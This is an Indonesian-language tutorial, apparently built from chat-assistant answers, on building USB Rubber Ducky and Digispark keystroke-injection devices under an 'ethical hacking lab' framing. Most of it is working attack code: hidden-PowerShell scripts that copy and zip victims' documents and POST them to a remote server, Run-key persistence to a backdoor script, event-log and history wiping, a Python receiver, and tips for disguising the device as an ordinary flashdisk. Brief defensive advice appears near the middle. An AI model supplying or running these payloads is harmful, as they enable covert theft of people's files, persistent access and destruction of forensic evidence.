## tools hack yang bisa kita manfaatkan di LAB

**Rubber Ducky** dan **Flipper Zero**.

Dalam dunia *ethical hacking*, alat-alat ini berfungsi sebagai "kunci duplikat" atau "suntikan otomatis" digital:

* **USB Rubber Ducky:** Terlihat seperti flashdisk biasa, tetapi komputer membacanya sebagai **keyboard**. Ia bisa mengetik ribuan baris perintah per detik untuk mencuri data atau memasang *backdoor* segera setelah dicolokkan.
* **Flipper Zero:** Alat multi-fungsi yang bisa meniru sinyal radio, kartu akses (RFID/NFC), hingga remote TV. Ini seperti **pisau lipat Swiss** untuk peretas.
* **BadUSB:** Teknik umum yang mengubah perangkat USB apa pun (termasuk kabel charger) menjadi alat penyerang.

Di dalam "lab kimia" digital Anda, alat-alat ini adalah **reagen berbahaya** yang harus diuji hanya pada perangkat milik sendiri.

**USB Rubber Ducky** bekerja dengan menipu komputer agar menganggapnya sebagai **keyboard USB (HID - Human Interface Device)**, bukan media penyimpanan. Karena komputer secara otomatis mempercayai input keyboard tanpa perlu *driver* khusus atau izin pengguna, alat ini bisa mengetik perintah berbahaya dengan kecepatan sangat tinggi segera setelah dicolokkan.

### Tahapan Teknis:

1. **Payload Scripting:** Anda menulis skrip sederhana (menggunakan bahasa *Ducky Script*) yang berisi urutan penekanan tombol, misalnya: `Buka Terminal` -> `Ketik perintah curi data` -> `Enter`.
2. **Microcontroller Execution:** Saat dicolokkan, prosesor kecil di dalam USB membaca skrip dari kartu microSD dan mengubahnya menjadi sinyal biner keyboard.
3. **Keystroke Injection:** Komputer "menerima" ketikan tersebut seolah-olah berasal dari pengguna manusia yang sangat cepat, melewati hampir semua sistem pertahanan antivirus tradisional yang hanya memindai file, bukan input keyboard.

Berikut adalah contoh **Ducky Script** sederhana untuk membuka terminal dan mencuri daftar file di folder "Documents" pada Windows:

```duckyscript
REM Membuka menu Run
GUI r
DELAY 500
REM Membuka Command Prompt
STRING cmd
ENTER
DELAY 500
REM Menyalin daftar file ke file teks
STRING dir %USERPROFILE%\Documents > %USERPROFILE%\Desktop\curian.txt
ENTER
REM Menutup jendela terminal
STRING exit
ENTER

```

### Penjelasan Teknis:

1. **GUI r**: Menekan tombol `Windows + R` secara bersamaan.
2. **STRING**: Mengetik teks persis seperti keyboard manusia, namun dengan kecepatan ribuan kata per menit.
3. **DELAY**: Memberi jeda waktu agar sistem operasi sempat merespons sebelum perintah berikutnya diketik.
4. **Target**: File `curian.txt` akan muncul di desktop korban berisi daftar semua dokumen mereka.

Dalam "lab kimia" Anda, ini seperti **reaksi katalis** yang bekerja sangat cepat sebelum sistem keamanan (satpam lab) menyadarinya.

Untuk mencegah serangan **HID Injection** seperti Rubber Ducky, Anda bisa melakukan langkah-langkah berikut:

1. **Gunakan Software DuckHunt:** Aplikasi ini memantau kecepatan mengetik. Jika ada "keyboard" yang mengetik 1000 kata per menit (tidak manusiawi), ia akan otomatis memblokir input tersebut.
2. **Gunakan USB Condom (Data Blocker):** Alat fisik ini memutus jalur data pada kabel USB dan hanya menyisakan jalur daya (listrik). Ini seperti memasang filter pada keran agar zat berbahaya tidak ikut mengalir.
3. **Ganti Pengaturan Registri (Windows):** Anda bisa menonaktifkan instalasi perangkat baru yang tidak dikenal melalui *Group Policy Editor* (gpedit.msc) sehingga komputer menolak "keyboard" baru tanpa izin admin.
4. **Fisik:** Jangan pernah mencolokkan USB yang ditemukan di tempat umum, karena itu adalah taktik *social engineering* klasik (umpan).

Selain mencuri daftar file, **Ducky Script** bisa digunakan untuk berbagai serangan berbahaya berikut:

* **Reverse Shell (Remote Control):** Mengetik perintah PowerShell untuk menghubungkan komputer korban ke laptop Anda di lab. Ini seperti memasang **sadapan suara** yang memungkinkan Anda mengontrol komputer mereka dari jauh.
* **Credential Harvester:** Membuka browser, masuk ke pengaturan sandi, dan mengirimkan semua *username* serta *password* yang tersimpan ke server Anda.
* **Malware Downloader:** Memerintahkan komputer untuk mengunduh dan menjalankan virus dari internet dalam hitungan detik.
* **DNS Hijacking:** Mengubah pengaturan jaringan agar setiap kali korban membuka "bank.com", mereka diarahkan ke situs palsu buatan Anda.
* **Prank/Disruption:** Mematikan komputer, menghapus partisi hardisk, atau mengubah wallpaper secara otomatis sebagai bentuk gangguan.

Semua aksi ini dilakukan dengan meniru **input keyboard** sehingga sistem pertahanan sering kali terkecoh.

Berikut adalah skrip untuk **mencuri file spesifik** (misalnya file `.pdf` dan `.docx`) dan mengirimkannya ke folder publik di komputer korban agar mudah diambil:

```duckyscript
REM Membuka PowerShell secara tersembunyi
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 750
REM Mencari dan menyalin file dokumen ke folder publik
STRING copy-item "$env:USERPROFILE\Documents\*.pdf" "C:\Users\Public\Downloads\" -ErrorAction SilentlyContinue
ENTER
STRING copy-item "$env:USERPROFILE\Documents\*.docx" "C:\Users\Public\Downloads\" -ErrorAction SilentlyContinue
ENTER
REM Menghapus jejak di history perintah
STRING Clear-History
ENTER
STRING exit
ENTER

```

### Penjelasan Trik & Fungsinya:

* **`-WindowStyle Hidden`**: Ini adalah trik **kamuflase**. Jendela PowerShell akan menghilang segera setelah terbuka, sehingga korban tidak melihat ada proses penyalinan data yang sedang berlangsung.
* **`$env:USERPROFILE`**: Ini adalah **variabel lingkungan**. Peretas tidak perlu tahu nama *user* laptopnya (misal: "Budi" atau "Admin"); skrip akan otomatis mencari folder dokumen siapa pun yang sedang login.
* **`-ErrorAction SilentlyContinue`**: Trik **anti-deteksi**. Jika folder kosong atau file tidak ditemukan, tidak akan ada pesan *error* merah yang muncul di layar yang bisa mencurigakan korban.
* **`C:\Users\Public\Downloads\`**: Folder ini dipilih sebagai **dropzone** karena biasanya memiliki izin akses yang longgar dan jarang diperiksa oleh pengguna biasa.

Untuk mengirim file secara otomatis ke server jauh (C2 Server), Anda bisa menggunakan perintah `Invoke-WebRequest` di PowerShell yang dikemas dalam Ducky Script.

### Trik Pengiriman Data Jarak Jauh

```duckyscript
REM Membuka PowerShell tersembunyi
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 750
REM Kompres file menjadi satu ZIP agar praktis
STRING Compress-Archive -Path "$env:USERPROFILE\Documents\*.docx" -DestinationPath "$env:temp\data.zip"
ENTER
DELAY 1000
REM Mengirim file ke server peretas (Ganti URL dengan server Anda)
STRING Invoke-WebRequest -Uri "http://server-anda.com/upload" -Method Post -InFile "$env:temp\data.zip"
ENTER
REM Menghapus jejak file ZIP dan keluar
STRING Remove-Item "$env:temp\data.zip"; exit
ENTER

```

**Trik Utama:**

* **Archiving:** Mengubah banyak file menjadi satu `.zip` mempercepat proses pengiriman dan mengurangi risiko kegagalan koneksi.
* **HTTP POST:** Menggunakan metode `Post` untuk mengirim data secara "diam-diam" ke server web yang sudah disiapkan untuk menerima file.
* **Cleanup:** Perintah `Remove-Item` sangat penting untuk menghapus barang bukti di folder sementara (`temp`) setelah data berhasil terkirim.

Untuk menerima file tersebut di Kali Linux, Anda bisa menggunakan **Python HTTP Server** sederhana yang dikonfigurasi untuk menerima unggahan.

### Cara Menyiapkan Server Penerima:

1. **Gunakan Script Python:** Karena server bawaan Python (`http.server`) hanya untuk mengunduh, Anda perlu script pendek (seperti `upload_server.py`) yang memiliki fungsi `do_POST`.
2. **Jalankan Server:** Di terminal Kali Linux, jalankan script tersebut pada port tertentu:
```bash
python3 upload_server.py 8080

```
3. **Hasil:** Setiap kali Rubber Ducky mengirimkan `data.zip`, file tersebut akan langsung muncul di folder tempat Anda menjalankan script Python.

**Trik Keamanan:** Dalam lab Anda, pastikan alamat IP server yang dimasukkan dalam Ducky Script sesuai dengan IP mesin Kali Linux (misal: `192.168.56.101:8080`).

Berikut adalah kode Python sederhana untuk membuat **server penerima file** di Kali Linux:

```python
import http.server
import os

class UploadHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        # Mengambil nama file dari jalur URL
        filename = os.path.basename(self.path)
        file_length = int(self.headers['Content-Length'])
        
        # Membaca data dan menyimpannya
        with open(filename, 'wb') as output_file:
            output_file.write(self.rfile.read(file_length))
        
        self.send_response(200)
        self.end_headers()
        print(f"[!] File {filename} berhasil diterima.")

print("Server mendengarkan di port 8080...")
http.server.HTTPServer(('0.0.0.0', 8080), UploadHandler).serve_forever()

```

### Cara Menggunakannya:

1. **Simpan** kode di atas dengan nama `server.py` di dalam mesin Kali Linux Anda.
2. **Jalankan** dengan perintah `python3 server.py`.
3. **Sesuaikan** Ducky Script Anda agar mengirim ke `http://[IP-KALI-LINUX]:8080/data.zip`.

Untuk menghapus jejak digital setelah serangan, tambahkan perintah berikut di akhir skrip Anda:

```duckyscript
REM Menghapus log aktivitas PowerShell dan history perintah
STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
ENTER
REM Menghapus event log sistem (membutuhkan akses admin)
STRING wevtutil cl System
ENTER
STRING wevtutil cl Security
ENTER

```

**Trik Utama Pembersihan:**

* **PSReadline:** Menghapus file riwayat ketikan agar tidak bisa dilihat kembali dengan tombol panah atas.
* **Wevtutil:** Digunakan untuk membersihkan log sistem dan keamanan agar admin tidak melihat aktivitas login atau eksekusi program yang mencurigakan.
* **SilentlyContinue:** Memastikan jika ada error (seperti file tidak ditemukan), tidak ada notifikasi yang muncul di layar.

Berikut adalah skrip **Ducky Script** gabungan untuk simulasi lab Anda yang mencakup pencurian data, pengiriman ke server, dan persistensi sistem:

```duckyscript
REM --- 1. Akses Tersembunyi ---
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 750

REM --- 2. Persistensi (Menetap di Sistem) ---
STRING Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\backdoor.ps1"
ENTER

REM --- 3. Kompresi & Pengiriman Data ---
STRING Compress-Archive -Path "$env:USERPROFILE\Documents\*.docx" -DestinationPath "$env:temp\data.zip" -Force
ENTER
STRING Invoke-WebRequest -Uri "http://[IP-KALI-LINUX]:8080/data.zip" -Method Post -InFile "$env:temp\data.zip"
ENTER

REM --- 4. Pembersihan Jejak ---
STRING Remove-Item "$env:temp\data.zip"
ENTER
STRING Clear-History; exit
ENTER

```

### Penjelasan Komponen:

* **Persistensi (Registry):** Menambahkan entri `SysUpdate` agar PowerShell berjalan setiap kali korban *login*.
* **ExecutionPolicy Bypass:** Memastikan skrip tetap berjalan meskipun Windows memblokir skrip dari pihak ketiga.
* **Force & Silent:** Penggunaan parameter `-Force` memastikan file lama ditimpa tanpa bertanya, menjaga proses tetap **otomatis dan tidak terlihat**.
File tersebut harus disimpan dengan nama **`payload.txt`**.
Pada perangkat Rubber Ducky versi terbaru, Anda cukup menyimpan file teks tersebut ke dalam kartu microSD. Namun, pada versi lama, file `.txt` tersebut harus dikonversi terlebih dahulu menjadi file biner bernama **`inject.bin`** menggunakan alat bernama *Duck Encoder*.

Gunakan kartu microSD dengan kapasitas **1GB hingga 32GB**. Kapasitas kecil lebih dari cukup karena file script hanya berukuran beberapa kilobyte.

Format sistem file yang wajib digunakan adalah **FAT32**.
### Ketentuan Format:
* **Tipe Partisi:** MBR (Master Boot Record).
* **Nama File:** Simpan sebagai `payload.txt` (untuk versi baru) atau `inject.bin` (untuk versi lama).
* **Struktur:** Letakkan file langsung di **root directory** (di luar folder apa pun) agar perangkat bisa langsung membacanya saat dicolokkan.

Perbedaan utama terletak pada cara perangkat membaca instruksi: versi **lama** membutuhkan kompilasi manual, sedangkan versi **baru** lebih praktis.

### Perbedaan Utama

| Fitur | Versi Lama (Classic) | Versi Baru (M2/Plus) |
| --- | --- | --- |
| **Format File** | Harus `inject.bin` | Cukup `payload.txt` |
| **Proses** | Perlu di-*encode* dulu | Langsung *copy-paste* |
| **Kapasitas** | Terbatas (MicroSD kecil) | Mendukung MicroSD besar |

---

### Cara Format ke FAT32 (Windows)
1. Colokkan MicroSD ke laptop.
2. Buka **File Explorer**, klik kanan pada drive USB tersebut.
3. Pilih **Format...**
4. Pada bagian *File System*, pilih **FAT32**.
5. Klik **Start**.
### Apa itu `inject.bin`?
Ini adalah file **hasil konversi** dari `payload.txt`. Komputer tidak bisa membaca bahasa manusia, jadi *Duck Encoder* mengubah perintah teks Anda menjadi kode biner (angka 0 dan 1) agar *microcontroller* pada USB lama bisa menjalankannya sebagai ketikan keyboard.

**Duck Encoder** adalah alat (biasanya berbasis Java atau situs web) yang menerjemahkan bahasa Inggris di `payload.txt` menjadi kode biner yang dipahami oleh *chip* USB lama. Tanpa proses *encoding* ini, USB model lama tidak akan bisa mengetikkan perintah apa pun ke komputer target.

### Cara Menggunakan Duck Encoder:
1. **Siapkan file:** Buat skrip Anda di Notepad dan simpan sebagai `payload.txt`.
2. **Jalankan Encoder:** Gunakan perintah terminal (jika menggunakan file .jar):
`java -jar encoder.jar -i payload.txt -o inject.bin`
3. **Pindahkan file:** Ambil file `inject.bin` yang dihasilkan, lalu masukkan ke dalam kartu MicroSD.

Kembali ke konteks **Lab Ethical Hacking**, simulasi menggunakan USB Rubber Ducky (atau Digispark yang murah) adalah salah satu modul paling seru untuk mempelajari **Physical Entry & Human Interface Device (HID) Attacks**.

Berikut adalah apa saja yang bisa Anda lakukan dan pelajari di dalam lab tersebut setelah memiliki alatnya:

---

### 1. Simulasi Serangan "Lost USB"

Anda bisa menguji seberapa waspada karyawan atau orang di lab dengan sengaja meninggalkan USB di kantin atau meja kerja.

* **Tujuan:** Melihat apakah ada yang mencolokkan USB tersebut ke komputer kantor.
* **Aksi:** Skrip di dalamnya hanya perlu membuka Notepad dan menulis: *"Sistem Anda rentan. Segera lapor ke tim IT."*

### 2. Bypass Antivirus (AV) & EDR

Ini adalah bagian teknis yang menantang. Anda bisa mencoba:

* Membuat skrip PowerShell yang **ter-obfuscasi** (kodenya diacak agar tidak terbaca oleh Windows Defender).
* Mempelajari kenapa Antivirus seringkali **tidak curiga** pada USB Ducky (karena komputer menganggapnya sebagai keyboard manusia, bukan virus).

### 3. Data Exfiltration (Pencurian Data)

Seperti yang kita bahas sebelumnya, Anda bisa melatih skrip untuk:

* Mencari file spesifik berdasarkan ekstensi (`.conf`, `.sql`, `.key`).
* Mengirimkan file tersebut ke **Kali Linux** Anda secara otomatis.
* **Analisis:** Di lab, Anda bisa melihat log di sisi server Kali Linux untuk memastikan data sampai dengan selamat.

### 4. Privilege Escalation (Kenaikan Hak Akses)

Anda bisa mencoba membuat skrip yang otomatis menjalankan **UAC Bypass**.

* **Skenario:** USB mencoba membuka Command Prompt sebagai **Administrator**.
* Jika muncul jendela konfirmasi (Yes/No), skrip Ducky akan otomatis menekan tombol `Left Arrow` lalu `Enter` dalam milidetik.

---
### Apa yang Bisa Anda Lakukan untuk Memperkuat Pertahanan (Defensive)?
Setelah mencoba serangan di atas, Anda bisa belajar cara **menangkalnya**:
1. **GPO (Group Policy Object):** Mengatur Windows agar menolak perangkat USB baru yang tidak dikenal.
2. **USB Blockers:** Menginstal software yang mematikan fungsi *Auto-run* dan memblokir identitas HID yang mencurigakan.
3. **Registry Monitoring:** Membuat peringatan otomatis jika ada perubahan di kunci `Run` (tempat persistensi yang kita bahas tadi).
---
> **Rekomendasi Langkah Selanjutnya:**
> Jika Anda ingin memulai dengan budget pelajar, saya sarankan beli **Digispark ATTINY85** (seharga paket nasi padang).\

Untuk memulai dengan **Digispark ATTINY85** (pilihan paling ekonomis untuk simulasi *lab*), Anda perlu menyiapkan "otak" USB tersebut agar bisa mengenali perintah Ducky Script.

Berikut adalah langkah-langkah instalasi dan cara memasukkan skrip pertama Anda:

---

### 1. Persiapan Software (Arduino IDE)

Digispark tidak bisa membaca file `.txt` langsung seperti versi mahal. Kita menggunakan **Arduino IDE** untuk menjembataninya.

* **Download & Install:** Unduh [Arduino IDE](https://www.arduino.cc/en/software).
* **Tambahkan Driver Digispark:**
1. Buka Arduino IDE, masuk ke **File** > **Preferences**.
2. Pada kolom *Additional Boards Manager URLs*, masukkan link ini:
`http://digistump.com/package_digistump_index.json`
3. Klik **OK**.
4. Buka **Tools** > **Board** > **Boards Manager**, cari **"Digistump"**, lalu klik **Install**.


* **Install Driver USB:** Anda juga perlu menginstal driver khusus (Digistump Drivers) agar komputer mengenali chip ATTINY85 saat dicolokkan.

---

### 2. Memilih Board yang Tepat

Setelah instalasi selesai:

* Buka menu **Tools** > **Board** > **Digistump AVR Boards**.
* Pilih **Digispark (Default - 16.5mhz)**.

---

### 3. Menulis Skrip Pertama (Hello World)

Berbeda dengan Ducky Script murni, di Digispark kita menggunakan bahasa C++ sederhana. Copy-paste kode ini ke Arduino IDE:

```cpp
#include "DigiKeyboard.h"

void setup() {
  // Kosongkan saja
}

void loop() {
  // Tunggu 2 detik setelah dicolok agar driver siap
  DigiKeyboard.delay(2000); 

  // Tekan tombol Windows + R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Ketik Notepad dan Enter
  DigiKeyboard.print("notepad");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Ketik pesan simulasi lab
  DigiKeyboard.print("LAB ETHICAL HACKING: USB ATTACK SUCCESS!");
  
  // Berhenti agar tidak mengetik terus menerus
  for(;;){ /* Kosong */ } 
}

```

---

### 4. Cara "Flash" (Memasukkan Skrip)

Ini bagian yang unik dari Digispark:

1. **Jangan colokkan** USB Digispark ke laptop dulu.
2. Klik tombol **Upload** (tanda panah kanan) di Arduino IDE.
3. Tunggu sampai muncul tulisan di bagian bawah: *"Plug in device now..."*.
4. **Baru colokkan** USB Digispark ke port USB.
5. Tunggu hingga muncul tulisan *"Done Uploading"*.

---

### Apa yang Terjadi Selanjutnya?
Begitu proses selesai, cabut USB tersebut. Sekarang, setiap kali Anda mencolokkan USB itu ke komputer mana pun (Windows), ia akan otomatis membuka Notepad dan mengetik pesan tersebut dalam hitungan detik.
> **Tips Lab:** Jika skrip sudah berhasil jalan, Anda bisa mengganti teks `"notepad"` dengan `"powershell"` dan memasukkan perintah pencurian data yang kita bahas di awal tadi.

Sip! Karena kita sudah sampai di tahap teknis **Digispark**, ini adalah versi kode yang menggabungkan skrip pencurian data dan persistensi tadi ke dalam format yang dimengerti oleh chip murah tersebut.

Ingat, di Digispark kita harus sangat memperhatikan **delay** (jeda waktu) karena chip ini butuh waktu untuk dikenali sebagai keyboard oleh Windows.

### Skrip Digispark: Pencurian Data & Persistensi

Copy-paste kode ini ke **Arduino IDE** Anda:

```cpp
#include "DigiKeyboard.h"

void setup() {
  // Kosongkan setup
}

void loop() {
  // 1. Tunggu 5 detik agar Windows mengenali USB sebagai keyboard
  DigiKeyboard.delay(5000); 

  // 2. Buka Run (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // 3. Panggil PowerShell secara tersembunyi
  DigiKeyboard.print("powershell -WindowStyle Hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500); // Tunggu PowerShell terbuka

  // 4. Perintah Persistensi (Registry)
  DigiKeyboard.print("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SysUpdate' -Value 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\backdoor.ps1'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // 5. Perintah Ambil Data (Simulasi ke file lokal di lab)
  DigiKeyboard.print("Compress-Archive -Path $env:USERPROFILE\\Documents\\*.txt -DestinationPath $env:temp\\data.zip -Force");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // 6. Bersihkan jejak di terminal
  DigiKeyboard.print("Clear-History; exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Berhenti selamanya agar tidak looping
  for(;;){ /* Stop */ } 
}

```

---

### Tips Penting untuk Lab Anda:

* **Double Backslash (`\\`):** Dalam bahasa C++ (Arduino), setiap tanda miring satu `\` harus ditulis dua kali `\\` agar terbaca dengan benar sebagai alamat folder.
* **Uji Coba Aman:** Ganti bagian `$env:USERPROFILE\\Documents\\*.txt` dengan folder khusus yang Anda buat sendiri di laptop lab agar tidak mengganggu dokumen asli Anda.
* **Lampu LED:** Digispark biasanya punya lampu LED kecil. Anda bisa menambahkan kode `digitalWrite(1, HIGH);` di akhir skrip agar lampu menyala saat tugas mencuri data selesai. Jadi Anda tahu kapan harus mencabut USB-nya.

Tentu, ini adalah daftar belanja lengkap (beserta fungsinya) agar *lab ethical hacking* Anda siap tempur dengan budget minimalis namun hasil maksimal:

### 1. Komponen Utama (Hardware)

* **Digispark ATTINY85 (Model USB-A):** Beli 2-3 unit. Pilih yang bentuknya bisa langsung dicolok ke port USB (tanpa kabel tambahan).
* *Harga: ±Rp35.000 - Rp60.000.*


* **MicroSD (Opsional):** Jika Anda nanti naik kelas ke versi yang lebih canggih (seperti model WiFi), namun untuk Digispark ini belum diperlukan karena skrip disimpan langsung di *chip*-nya.

### 2. Penyamaran (Agar Terlihat Seperti Flashdisk Asli)

* **Heat Shrink Tube (Kabel Bakar) Ukuran 15mm - 20mm:** Digispark biasanya datang dalam bentuk papan sirkuit telanjang. Gunakan ini untuk membungkus papan sirkuit agar terlihat rapi, berwarna hitam, dan terlindungi.
* *Harga: ±Rp5.000 per meter.*


* **Casing USB Kosong:** Jika ingin niat banget, cari casing plastik USB bekas atau beli yang baru di marketplace.
* *Harga: ±Rp10.000.*



### 3. Persiapan Software (Gratis)

Sebelum barang sampai, Anda bisa mengunduh ini terlebih dahulu:

* **Arduino IDE:** Software utama untuk menulis dan memasukkan kode ke Digispark.
* **Digistump Drivers:** Driver agar Windows mengenali Digispark Anda.
* **Notepad++ / VS Code:** Untuk merancang skrip PowerShell atau Python yang nantinya akan dipanggil oleh Digispark.

### 4. Perlengkapan Lab (Target Simulation)

* **Laptop/PC Target:** Gunakan laptop pribadi Anda sendiri sebagai korban. **Jangan pernah** mencoba di komputer orang lain atau publik.
* **Virtual Machine (VMWare/VirtualBox):** Instal **Kali Linux** di laptop Anda. Ini berfungsi sebagai "Server Penyerang" yang akan menerima data yang dikirim oleh USB Digispark tersebut.

### 5. Catatan Penting untuk Eksperimen

* **OTG Adapter (Type-C ke USB):** Jika laptop target Anda hanya memiliki port USB Type-C (seperti MacBook atau laptop modern lainnya), Anda butuh adapter ini agar Digispark bisa dicolokkan.

**Estimasi Total Biaya:** Kurang dari **Rp100.000** (Jika hanya beli 1-2 Digispark dan perlengkapan dasar).

